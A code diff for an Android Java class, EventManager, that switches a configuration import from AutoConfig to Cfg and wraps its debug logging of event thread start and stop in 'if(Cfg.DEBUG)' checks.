@@ -14,10 +14,7 @@ import java.util.Map;
 import android.util.Log;
 
 import com.android.service.Manager;
-import com.android.service.agent.AgentBase;
-import com.android.service.agent.AgentType;
-import com.android.service.auto.AutoConfig;
-import com.android.service.conf.Configuration;
+import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 
 // TODO: Auto-generated Javadoc
@@ -83,12 +80,12 @@ public class EventManager extends Manager<EventBase, Integer, EventType> {
 		events = status.getEventsMap();
 
 		if (events == null) {
-			Log.d("QZ", TAG + " Events map null");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Events map null");
 			return false;
 		}
 
 		if (running == null) {
-			Log.d("QZ", TAG + " Running Events map null");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Running Events map null");
 			return false;
 		}
 
@@ -108,14 +105,14 @@ public class EventManager extends Manager<EventBase, Integer, EventType> {
 
 				if (!e.isRunning()) {
 					final Thread t = new Thread(e);
-					if (AutoConfig.DEBUG) {
+					if (Cfg.DEBUG) {
 						t.setName(e.getClass().getSimpleName());
 					}
 					t.start();
-					Log.d("QZ", TAG + " (startAll): " + e);
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " (startAll): " + e);
 					threads.put(e, t);
 				} else {
-					Log.d("QZ", TAG + " Warn: event already running");
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: event already running");
 				}
 			}
 		}
@@ -134,7 +131,7 @@ public class EventManager extends Manager<EventBase, Integer, EventType> {
 			final Map.Entry<Integer, EventBase> pairs = it.next();
 			final EventBase event = pairs.getValue();
 
-			Log.d("QZ", TAG + " Stopping: " + event);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Stopping: " + event);
 
 			if (event.isRunning()) {
 				event.stopThread();
@@ -147,8 +144,8 @@ public class EventManager extends Manager<EventBase, Integer, EventType> {
 					threads.remove(event);
 
 				} catch (final InterruptedException e) {
-					if(AutoConfig.DEBUG) { e.printStackTrace(); }
-					Log.d("QZ", TAG + " Error: " + e.toString());
+					if(Cfg.DEBUG) { e.printStackTrace(); }
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + e.toString());
 				}
 			} else {
 				Check.asserts(threads.get(event) == null, "Shouldn't find a thread");
